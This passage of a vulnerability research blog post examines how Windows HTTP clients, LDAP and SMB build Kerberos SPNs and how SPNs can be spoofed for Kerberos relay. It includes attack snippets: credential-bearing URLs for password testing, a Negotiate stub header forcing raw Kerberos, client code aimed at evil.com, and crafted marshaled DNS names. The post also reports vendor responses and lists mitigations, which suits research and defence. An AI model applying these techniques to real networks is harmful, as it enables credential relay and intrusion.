 <p class="c0"><span class="c3">As most clients have a relatively long timeout of 3-5 seconds, that might be enough time to try the majority of the combinations for the ID and port. Of course there isn&#39;t really a penalty for trying multiple times. If this attack was practical then you could do the attack on a local network even if local DNS resolution was disabled and enable the attack for libraries which only do a single lookup such as WinINET and WinHTTP. The response could have a long TTL, so that when the access is successful it doesn&#39;t need to be repeated for every request.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>I couldn&#39;t get Chromium to downgrade </span><span class="c4">Negotiate </span><span>to </span><span class="c4">Kerberos</span><span>&nbsp;only so Integrity will be enabled. Also since Delegation is not enabled by default, an administrator needs to configure an </span><span class="c8"><a class="c51" href="https://admx.help/?Category=Chrome&Policy=Google.Policies.Chrome::AuthNegotiateDelegateWhitelist">allow list GPO</a></span><span class="c3">&nbsp;to specify what targets are allowed to receive delegated credentials.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>A bonus quirk for Chromium: It seems to be the only browser which still supports URL based user credentials. If you pass user credentials in the request and get the server to return a request for </span><span class="c4">Negotiate </span><span>authentication then it&#39;ll authenticate automatically regardless of the zone of the site. You can also pass credentials using </span><span class="c4">XMLHttpRequest::open</span><span class="c3">.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">While not very practical, this can be used to test a user&#39;s password from an arbitrary host. If the username/password is correct and the SPN is spoofed then Chromium will send a validated Kerberos AP_REQ, otherwise either NTLM or no authentication will be sent. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>NTLM can be always generated as it doesn&#39;t require any proof the password is valid, whereas Kerberos requires the password to be correct to allow the authentication to succeed. You need to specify the domain name when authenticating so you use a URL of the form </span><span class="c25 c14 c4">http://DOMAIN%5CUSER:PASSWORD@host.com.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One other quirk of this is you can specify a fully qualified domain name (FQDN) and user name and the Windows Kerberos implementation will try and authenticate using that server based on the DNS SRV records. For example </span><span class="c4">http://EVIL.COM%5CUSER:PASSWORD@host.com</span><span>&nbsp;will try to authenticate to the Kerberos service specified through the </span><span class="c4">_kerberos._tcp.evil.com</span><span>&nbsp;SRV record</span><span class="c3">. This trick works even on non-domain joined systems to generate Kerberos authentication, however it&#39;s not clear if this trick has any practical use.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>It&#39;s worth noting that I did discuss the implications of the Chromium HTTP vector with team members internally and the general conclusion that this behavior is by design as it&#39;s trying to copy the behavior expected of existing user agents such as IE.</span><span class="c3">&nbsp;Therefore there was no expectation it would be fixed.</span></p><h3 class="c32" id="h.xfgb3dttm6vh"><span class="c31">Firefox 91</span></h3>
 <p class="c0"><span>As with Chromium, Firefox is open source so we can find the </span><span class="c8"><a class="c51" href="https://searchfox.org/mozilla-central/source/extensions/auth/nsHttpNegotiateAuth.cpp#170">implementation</a></span><span>. Unlike the other HTTP implementations researched up to this point, Firefox doesn&#39;t perform Windows authentication by default. An administrator needs to configure either a list of hosts that are allowed to automatically authenticate, or the </span><span class="c4">network.negotiate-auth.allow-non-fqdn</span><span class="c3">&nbsp;setting can be enabled to authenticate to non-dotted host names.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>If authentication is enabled it works with both local DNS resolving and public DNS as it does a second DNS lookup when constructing the SPN for </span><span class="c4">Negotiate </span><span>in </span><span class="c8"><a class="c51" href="https://searchfox.org/mozilla-central/source/extensions/auth/nsAuthSSPI.cpp#93">nsAuthSSPI::MakeSN</a></span><span class="c3">. Unlike Chromium there doesn&#39;t seem to be a setting to disable this behavior.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Once again I couldn&#39;t get Firefox to use raw Kerberos, so Integrity is enabled. Also Delegation is not enabled unless an administrator configures the </span><span class="c4">network.negotiate-auth.delegation-uris</span><span>&nbsp;setting.</span></p><h3 class="c32" id="h.hj80sqr0xa9u"><span class="c31">.NET Framework 4.8</span></h3>
 <p class="c0"><span>The .NET Framework 4.8 officially has two HTTP libraries, the original </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest">System.Net.HttpWebRequest</a></span><span>&nbsp;and derived APIs and the newer </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient">System.Net.Http.HttpClient</a></span><span class="c3">&nbsp;API. However in the .NET framework the newer API uses the older one under the hood, so we&#39;ll only consider the older of the two.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Windows authentication is only generated automatically if the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest.usedefaultcredentials">UseDefaultCredentials</a></span><span>&nbsp;property is set to true on the </span><span class="c4">HttpWebRequest</span><span>&nbsp;object as shown below </span><span>(technically this sets the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials">CredentialCache.DefaultCredentials</a></span><span class="c3">&nbsp;object, but it&#39;s easier to use the boolean property). Once the default credentials are set the client will automatically authenticate using Windows authentication to any host, it doesn&#39;t seem to care if that host is in the Intranet zone.</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.7e4822d1f02afd7da5d70f6bb7cc98084373024a"></a><a id="t.3"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c7"><span class="c2 c13">var</span><span class="c2">&nbsp;request = WebRequest.CreateHttp(</span><span class="c2 c36">&quot;http://www.evil.com&quot;</span><span class="c6 c2">);</span></p>
 <p class="c7"><span class="c2">request.UseDefaultCredentials = </span><span class="c2 c13">true</span><span class="c6 c2">;</span></p>
 <p class="c7"><span class="c2 c13">var</span><span class="c2">&nbsp;response = (HttpWebResponse)request.GetResponse();</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The SPN is generated in the </span><span class="c8"><a class="c51" href="https://referencesource.microsoft.com/#System/net/System/Net/_AuthenticationState.cs,114">System.Net.AuthenticationState.GetComputeSpn</a></span><span>&nbsp;function which we can find in the .NET reference source. The SPN is built from the canonical name returned by the initial DNS lookup, which means it supports the local but not public DNS resolution. If you follow the code it does support doing a second DNS lookup if the host is undotted, however this is only if the client code sets an explicit </span><span class="c4">Host </span><span class="c3">header as far as I can tell. Note that the code here is slightly different in .NET 2.0 which might support looking up the canonical name as long as the host name is undotted, but I&#39;ve not verified that.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The .NET Framework supports specifying </span><span class="c4">Kerberos</span><span>&nbsp;directly as the authentication type in the </span><span class="c4">WWW-Authentication</span><span class="c3">&nbsp;header. As the client code doesn&#39;t explicitly request integrity, this allows the Kerberos AP_REQ to not have Integrity enabled. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The code also supports the </span><span class="c4">WWW-Authentication</span><span>&nbsp;header having an initial token, so even if Kerberos wasn&#39;t directly supported, you could use </span><span class="c4">Negotiate</span><span>&nbsp;and specify the stub token I described at the start to force Kerberos authentication. For example returning the following header with the initial 401 status response will force </span><span class="c4">Kerberos </span><span class="c3">through auto-detection:</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.47f2d775b3f960ad13600d96e3bddd754ab896ed"></a><a id="t.4"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c0"><span class="c2">WWW-Authenticate: Negotiate AAFA</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Finally, the authentication code always enables delegation regardless of the target host.</span></p><h3 class="c32" id="h.55txgo3a2wq5"><span class="c31">.NET 5.0</span></h3>
 <p class="c0"><span>The .NET 5.0 runtime has deprecated the </span><span class="c4">HttpWebRequest</span><span>&nbsp;API in favor of the </span><span class="c4">HttpClient</span><span>&nbsp;API. It uses a new backend class called the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.socketshttphandler">SocketsHttpHandler</a></span><span>. As it&#39;s all open source we can find the </span><span class="c8"><a class="c51" href="https://github.com/dotnet/runtime/blob/791a0d896052f61161aff4c1ccb5f3425328f9a8/src/libraries/System.Net.Http/src/System/Net/Http/SocketsHttpHandler/AuthenticationHelper.NtAuth.cs">implementation</a></span><span>, specifically the </span><span class="c4">AuthenticationHelper </span><span class="c3">class which is a complete rewrite from the .NET Framework version.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>To automatically authenticate, the client code must either use the </span><span class="c4">HttpClientHandler </span><span>class and set the </span><span class="c4">UseDefaultCredentials </span><span>property as shown below. Or if using </span><span class="c4">SocketsHttpHandler</span><span>, set the </span><span class="c4">Credentials </span><span>property to the default credentials. This handler must then be specified when creating the </span><span class="c4">HttpClient </span><span class="c3">object.</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.558674b491818f584c342a8a8dd3989575c4c999"></a><a id="t.5"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c7"><span class="c2 c13">var</span><span class="c2">&nbsp;handler = </span><span class="c2 c13">new</span><span class="c6 c2">&nbsp;HttpClientHandler();</span></p>
 <p class="c7"><span class="c2">handler.UseDefaultCredentials = </span><span class="c2 c13">true</span><span class="c6 c2">;</span></p>
 <p class="c7"><span class="c2 c13">var</span><span class="c2">&nbsp;client = </span><span class="c2 c13">new</span><span class="c6 c2">&nbsp;HttpClient(handler);</span></p>
 <p class="c7"><span class="c2 c13">await</span><span class="c2">&nbsp;client.GetStringAsync(</span><span class="c2 c36">&quot;http://www.evil.com&quot;</span><span class="c2">);</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Unless the client specified an explicit </span><span class="c4">Host </span><span class="c3">header in the request the authentication will do a DNS lookup for the canonical name. This is separate from the DNS lookup for the HTTP connection so it supports both local and public DNS attacks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">While the implementation doesn&#39;t support Kerberos directly like the .NET Framework, it does support passing an initial token so it&#39;s still possible to force raw Kerberos which will disable the Integrity requirement.</span></p><h3 class="c32" id="h.9k5bin8hhfky"><span class="c31">.NET 6.0</span></h3>
 <p class="c0"><span>The .NET 6.0 runtime is basically the same as .NET 5.0, except that Integrity is specified explicitly when creating the client authentication context. This means that rolling back to Kerberos no longer has any advantage. </span><span class="c8"><a class="c51" href="https://github.com/dotnet/runtime/commit/17481fef502ee6aed6f9e8fc76e45bb5863c68b5">This change</a></span><span class="c3">&nbsp;seems to be down to a broken implementation of NTLM on macOS and not as some anti-NTLM relay measure.</span></p><h3 class="c32" id="h.liq0ng1hwkl2"><span class="c31">HTTP Overview</span></h3>
 <p class="c0"><span class="c3">The following table summarizes the results of the HTTP protocol research:</span></p><ul style="padding: 0;" class="c24 lst-kix_2yktnm17nyl7-0 start"><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The </span><span class="c4">LLMNR </span><span>column </span><span class="c3">indicates it&#39;s possible to influence the SPN using a local DNS resolver attack </span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c4">DNS CNAME</span><span class="c3">&nbsp;indicates a public DNS resolving attack </span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c4">Delegation </span><span class="c3">indicates the HTTP user agent enables Kerberos delegation </span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c4">Integrity </span><span class="c3">indicates that integrity protection is requested which reduces the usefulness of the relayed authentication if the target server automatically detects the setting.</span></li></ul>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.6768360573c54e4f01434a9fa509149b13842614"></a><a id="t.6"></a><table class="c21"><tbody><tr class="c20"><td class="c15 c33" colspan="1" rowspan="1">
 <p class="c1"><span class="c25 c14 c4">User Agent</span></p></td><td class="c29 c33" colspan="1" rowspan="1">
 <p class="c1"><span class="c25 c14 c4">LLMNR</span></p></td><td class="c30 c33" colspan="1" rowspan="1">
 <p class="c1"><span class="c25 c14 c4">DNS CNAME</span></p></td><td class="c10 c33" colspan="1" rowspan="1">
 <p class="c1"><span class="c25 c14 c4">Delegation</span></p></td><td class="c22 c33" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">Integrity</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Internet Explorer 11 (WinINET)</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">WebDAV (WinHTTP)</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Chromium (M93)</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span>No</span><span class="c25 c38">&dagger;</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Firefox 91</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span>No</span><span class="c41">&dagger;</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">.NET Framework 4.8</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span>No</span><span class="c38 c25">&Dagger;</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">.NET 5.0</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td></tr><tr class="c20"><td class="c15" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">.NET 6.0</span></p></td><td class="c29" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c30" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">No</span></p></td><td class="c22" colspan="1" rowspan="1">
 <p class="c1"><span class="c3">Yes</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">&dagger; Chromium and Firefox can enable delegation only on a per-site basis through a GPO.</span></p>
 <p class="c0"><span class="c3">&Dagger; .NET Framework supports DNS resolving in special circumstances for non-dotted hostnames.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">By far the most permissive client is .NET 5.0. It supports authenticating to any host as long as it has been configured to authenticate automatically. It also supports arbitrary SPN spoofing from a public DNS name as well as disabling integrity through Kerberos fallback. However, as .NET 5.0 is designed to be something usable cross platform, it&#39;s possible that few libraries written with it in mind will ever enable automatic authentication.</span></p><h2 class="c26" id="h.ip4rfjjchenz"><span class="c6 c19">LDAP</span></h2>
 <p class="c0"><span>Windows has a built-in general purpose LDAP library in </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/_ldap/">wldap32.dll</a></span><span>. This is used by the majority of OS components when accessing Active Directory and is also used by the .NET </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection">LdapConnection</a></span><span>&nbsp;class. There doesn&#39;t seem to be a way of specifying the SPN manually for the LDAP connection using the API. Instead it&#39;s built manually based on the canonical name based on the DNS lookup. Therefore it&#39;s exploitable in a similar manner to </span><span>WinINET</span><span class="c3">&nbsp;via local DNS resolution.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The name of the LDAP server can also be found by querying for a SRV record for the hostname. This is used to support accessing the LDAP server from the top-level Windows domain name. This will usually return an address record alongside, all this does is change the server resolution process which doesn&#39;t seem to give any advantages to exploitation.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Whether the LDAP client enables integrity checking is based on the value of the </span><span class="c4">LDAP_OPT_SIGN</span><span>&nbsp;flag. As the connection only supports </span><span class="c4">Negotiate </span><span>authentication the client passes the </span><span class="c4">ISC_REQ_NO_INTEGRITY</span><span class="c3">&nbsp;flag if signing is disabled so that the server won&#39;t accidentally auto-detect the signing capability enabled for the Negotiate MIC and accidentally enable signing protection.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>As part of </span><span class="c8"><a class="c51" href="https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a">recent changes</a></span><span>&nbsp;to LDAP signing the client is forced to enable Integrity by the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-ldap-client-signing-requirements">LdapClientIntegrity policy</a></span><span>. This means that regardless of whether the LDAP server needs integrity protection it&#39;ll be enabled on the client which in turn will automatically enable it on the server. Changing the value of </span><span class="c4">LDAP_OPT_SIGN</span><span class="c3">&nbsp;in the client has no effect once this policy is enabled.</span></p><h2 class="c26" id="h.m3ajz9uje54l"><span class="c6 c19">SMB</span></h2>
 <p class="c0"><span class="c3">SMB is one of the most commonly exploited protocols for NTLM relay, as it&#39;s easy to convert access to a file into authentication. It would be convenient if it was also exploitable for Kerberos relay. While SMBv1 is deprecated and not even installed on newer installs of Windows, it&#39;s still worth looking at the implementation of v1 and v2 to determine if either are exploitable.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The client implementations of SMB 1 and 2 are in </span><span class="c4">mrxsmb10.sys</span><span>&nbsp;and </span><span class="c4">mrxsmb20.sys</span><span>&nbsp;respectively with some common code in </span><span class="c4">mrxsmb.sys</span><span>. Both protocols support specifying a name for the SPN which is related to DFS. The SPN name needs to be specified through the </span><span class="c4">GUID_ECP_DOMAIN_SERVICE_NAME_CONTEXT</span><span>&nbsp;ECP and is only enabled if the </span><span class="c4">NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH </span><span>flag in the </span><span class="c4">GUID_ECP_NETWORK_OPEN_CONTEXT </span><span class="c3">ECP (set by MUP) is specified. This is related to UNC hardening which was added to protect things like group policies.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>It&#39;s easy enough to trigger the conditions to set the </span><span class="c4">NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH</span><span>&nbsp;flag. The default UNC hardening rules always add SYSVOL and NETLOGON UNC paths with a wildcard hostname. Therefore a request to </span><span class="c4">\\evil.com\SYSVOL</span><span class="c3">&nbsp;will cause the flag to be set and the SPN potentially overridable. The server should be a DFS server for this to work, however even with the flag set I&#39;ve not found a way of setting an arbitrary SPN value remotely.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Even if you could spoof the SPN, the SMB clients always enable Integrity protection. Like LDAP, SMB will enable signing and encryption opportunistically if available from the client, unless UNC hardening measures are in place.</span></p><h2 class="c26" id="h.kia6c4byjbr3"><span class="c6 c19">Marshaled Target Information SPN</span></h2>
 <p class="c0"><span>While investigating the SMB implementation I noticed something interesting. The SMB clients use the function </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-secmakespnex2">SecMakeSPNEx2</a></span><span>&nbsp;to build the SPN value from the service class and name. You might assume this would just return the SPN as-is, however that&#39;s not the case. Instead for the hostname of </span><span class="c4">fileserver </span><span>with the service class </span><span class="c4">cifs</span><span class="c3">&nbsp;you get back an SPN which looks like the following:</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.0468306ab73a53f6535ab8bb12a4cae517044efb"></a><a id="t.7"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c0"><span class="c2 c4">cifs/fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Looking at the implementation of </span><span class="c4">SecMakeSPNEx2</span><span>&nbsp;it makes a call to the API function </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nf-ntsecpkg-credmarshaltargetinfo">CredMarshalTargetInfo</a></span><span>. This API takes a list of target information in a </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationw">CREDENTIAL_TARGET_INFORMATION</a></span><span class="c3">&nbsp;structure and marshals it using a base64 string encoding. This marshaled string is then appended to the end of the real SPN.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The code is therefore just appending some additional target information to the end of the SPN, presumably so it&#39;s easier to pass around. My initial assumption would be this information is stripped off before passing to the SSPI APIs by the SMB client. However, passing this SPN value to </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;as the target name succeeds and gets a Kerberos service ticket for </span><span class="c4">cifs/fileserver</span><span class="c3">. How does that work?</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Inside the function </span><span class="c4">SspiExProcessSecurityContext </span><span>in </span><span class="c4">lsasrv.dll</span><span>, which is the main entrypoint of </span><span class="c4">InitializeSecurityContext, </span><span>there&#39;s a call to the </span><span class="c4">CredUnmarshalTargetInfo </span><span>API, which parses the marshaled target information. However </span><span class="c4">SspiExProcessSecurityContext </span><span class="c3">doesn&#39;t care about the unmarshalled results, instead it just gets the length of the marshaled data and removes that from the end of the target SPN string. Therefore before the Kerberos package gets the target name it has already been restored to the original SPN.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The encoded SPN shown earlier, minus the service class, is a valid DNS component name and therefore could be used as the hostname in a public or local DNS resolution request. This is interesting as this potentially gives a way of spoofing a hostname which is distinct from the real target service, but when processed by the SSPI API requests the spoofed service ticket. As in if you use the string </span><span class="c42 c4">fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA</span><span>&nbsp;as the DNS name, and if the client appends a service class to the name and passes it to SSPI it will get a service ticket for </span><span class="c4">fileserver</span><span class="c3">, however the DNS resolving can trivially return an unrelated IP address.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>There are some big limitations to abusing this behavior. The marshaled target information must be valid, the last 6 characters is an encoded length of the entire marshaled buffer and the buffer is prefixed with a 28 byte header with a magic value of 0x91856535 in the first 4 bytes. If this length is invalid (e.g. larger than the buffer or not a multiple of 2) or the magic isn&#39;t present then the </span><span class="c4">CredUnmarshalTargetInfo </span><span>call fails and </span><span class="c4">SspiExProcessSecurityContext</span><span class="c3">&nbsp;leaves the SPN as is which will subsequently fail to query a Kerberos ticket for the SPN.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The easiest way that the name could be invalid is by it being converted to lowercase. DNS is case insensitive, however generally the servers are case preserving. Therefore you could lookup the case sensitive name and the DNS server would return that unmodified. However the HTTP clients tested all seem to lowercase the hostname before use, therefore by the time it&#39;s used to build an SPN it&#39;s now a different string. When unmarshalling &#39;a&#39; and &#39;A&#39; represent different binary values and so parsing of the marshaled information will fail.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Another issue is that the size limit of a single name in DNS is 63 characters. The minimum valid marshaled buffer is 44 characters long leaving only 19 characters for the SPN part. This is at least larger than the minimum NetBIOS name limit of 15 characters so as long as there&#39;s an SPN for that shorter name registered it should be sufficient. However if there&#39;s no short SPN name registered then it&#39;s going to be more difficult to exploit.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">In theory you could specify the SPN using its FQDN. However it&#39;s hard to construct such a name. The length value must be at the end of the string and needs to be a valid marshaled value so you can&#39;t have any dots within its 6 characters. It&#39;s possible to have a TLD which is 6 characters or longer and as the embedded marshaled values are not escaped this can be used to construct a valid FQDN which would then resolve to another SPN target. For example:</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.18557f87bd0691805cf0d36ab288c563e4a9d02e"></a><a id="t.8"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c0"><span class="c2 c4">fileserver1UWhRCAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAA.domain.oBAAAA</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>is a valid DNS name which would resolve to an SPN for </span><span class="c4">fileserver</span><span>. Except that </span><span class="c4">oBAAAA</span><span>&nbsp;is not a valid public TLD. Pulling the list of </span><span class="c8"><a class="c51" href="https://data.iana.org/TLD/tlds-alpha-by-domain.txt">valid TLDs</a></span><span>&nbsp;from ICANN&#39;s website and converting all values which are 6 characters or longer into the expected length value, the smallest length which is a multiple of 2 is from </span><span class="c4">WEBCAM</span><span>&nbsp;</span><span>which results in a DNS name at least 264331 characters long, which is somewhat above the 255 character limit usually considered valid for a FQDN in DNS.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Therefore this would still be limited to more local attacks and only for limited sets of protocols. For example an authenticated user could register a DNS entry for the local domain using this value and trick an RPC client to connect to it using its undotted hostname. As long as the client doesn&#39;t modify the name other than putting the service class on it (or it gets automatically generated by the RPC runtime) then this spoofs the SPN for the request.</span></p><h2 class="c26" id="h.bxbpd7nw1n75"><span class="c6 c19">Microsoft&#39;s Response to the Research</span></h2>
 <p class="c0"><span class="c3">I didn&#39;t initially start looking at Kerberos authentication relay, as mentioned I found it inadvertently when looking at IPsec and AuthIP which I subsequently reported to Microsoft. After doing more research into other network protocols I decided to use the AuthIP issue as a bellwether on Microsoft&#39;s views on whether relaying Kerberos authentication and spoofing SPNs would cross a security boundary.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>As I mentioned earlier the AuthIP issue was classed as &quot;vNext&quot;, which denotes it might be fixed in a future version of Windows, but not as a security update for any currently shipping version of Windows. This was because Microsoft determined it to be a Moderate severity issue (see </span><span class="c8"><a class="c51" href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2A3xt">this</a></span><span>&nbsp;</span><span class="c3">for the explanation of the severities). Only Important or above will be serviced.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>It seems that the general rule is that any network protocol where the SPN can be spoofed to generate Kerberos authentication which can be relayed, is not sufficient to meet the severity level for a fix. However, any network facing service which can be used to induce authentication where the attacker does not have existing network authentication credentials is considered an Important severity spoofing issue and will be fixed. This is why PetitPotam was fixed as </span><span class="c8"><a class="c51" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942">CVE-2021-36942</a></span><span class="c3">, as it could be exploited from an unauthenticated user.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>As my research focused entirely on the network protocols themselves and not the ways of inducing authentication, they will all be covered under the same Moderate severity. This means that if they were to be fixed at all, it&#39;d be in unspecified future versions of Windows.</span></p><h2 class="c26" id="h.7zz0k0f1r0u6"><span class="c6 c19">Available Mitigations</span></h2>
 <p class="c0"><span class="c3">How can you defend yourself against authentication relay attacks presented in this blog post? While I think I&#39;ve made the case that it&#39;s possible to relay Kerberos authentication, it&#39;s somewhat more limited in scope than NTLM relay. This means that disabling NTLM is still an invaluable option for mitigating authentication relay issues on a Windows enterprise network. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Also, except for disabling NTLM, all the mitigations for NTLM relay apply to Kerberos relay. Requiring signing or sealing on the protocol if possible is sufficient to prevent the majority of attack vectors, especially on important network services such as LDAP.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
